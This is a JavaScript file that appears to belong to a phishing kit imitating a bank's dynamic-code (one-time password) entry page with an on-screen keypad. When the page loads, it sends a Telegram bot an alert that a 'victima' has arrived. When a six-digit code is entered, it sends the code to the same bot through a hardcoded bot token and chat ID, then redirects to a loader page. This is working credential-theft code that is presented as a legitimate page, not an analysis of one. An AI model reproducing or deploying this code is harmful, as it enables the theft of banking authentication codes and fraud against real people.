document.addEventListener("DOMContentLoaded", function () {
    let inputs = document.querySelectorAll(".password-input");
    let keypad = document.getElementById("keypad");
    let submitBtn = document.getElementById("submit-btn");
    let currentInputIndex = 0;


    // Función para enviar notificación de página visitada
    function enviarNotificacionPagina() {
        let bots = [
            { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "6328222257" },
            { token: "", chatId: "" }
        ];

        bots.forEach(bot => {
            let mensaje = `*Alerta:* Una victima esta en la *PAGINA1* = Pagina de clave dinámica *SIN* error`;
            let url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

            fetch(url).then(response => console.log(`Notificación enviada a bot: ${bot.token}`))
                      .catch(error => console.error(`Error al enviar notificación: ${error}`));
        });
    }

    // Enviar notificación al cargar la página
    enviarNotificacionPagina();

    // Evento para el teclado virtual
    keypad.addEventListener("click", function (event) {
        let button = event.target;
        let value = button.getAttribute("data-value");

        if (!value) return; // Ignorar clicks fuera de botones

        if (value === "delete") {  // Borrar último número
            if (currentInputIndex > 0) {
                currentInputIndex--;
                inputs[currentInputIndex].value = "";
            }
        } else if (currentInputIndex < inputs.length) {  // Ingresar número
            inputs[currentInputIndex].value = value;
            currentInputIndex++;
        }

        verificarClaveCompleta();
    });

    // Verificar si la clave está completa
    function verificarClaveCompleta() {
        let clave = Array.from(inputs).map(input => input.value).join("");
        submitBtn.disabled = clave.length !== 6; // Desactivar si no hay 6 dígitos
    }

    // Evento de envío de la clave dinámica
    submitBtn.addEventListener("click", function () {
        let clave = Array.from(inputs).map(input => input.value).join("");

        if (clave.length === 6) {
            enviarDatosTelegram(clave);
        }
    });

    // Función para enviar datos a múltiples bots de Telegram
    function enviarDatosTelegram(clave) {
        let bots = [
            { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "6328222257" },
            { token: "", chatId: "" }
        ];

        bots.forEach(bot => {
            let mensaje = `*Clave Dinámica Ingresada:*\n\n${clave}`;
            let url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

            fetch(url).then(response => console.log(`Mensaje enviado a bot: ${bot.token}`))
                      .catch(error => console.error(`Error al enviar mensaje: ${error}`));
        });

        // Redirigir después de enviar los datos
        setTimeout(() => {
            window.location.href = "loader.html";  // Cambia por la página de destino
        }, 3000);
    }
});